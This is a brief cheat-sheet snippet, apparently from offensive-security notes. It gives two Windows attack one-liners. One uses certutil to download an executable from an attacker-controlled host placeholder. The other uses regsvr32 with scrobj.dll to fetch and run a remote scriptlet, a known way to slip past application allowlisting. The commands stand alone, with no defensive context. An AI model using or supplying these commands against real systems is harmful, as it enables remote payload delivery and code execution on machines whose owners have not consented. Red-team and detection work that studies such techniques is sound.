## Download with certutil
`certutil -URLcache -split -f http://<ATTACKER_IP>/file.exe c:\<path>\<to>\<file.exe>`
## Execute with regsvr32
`regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll`
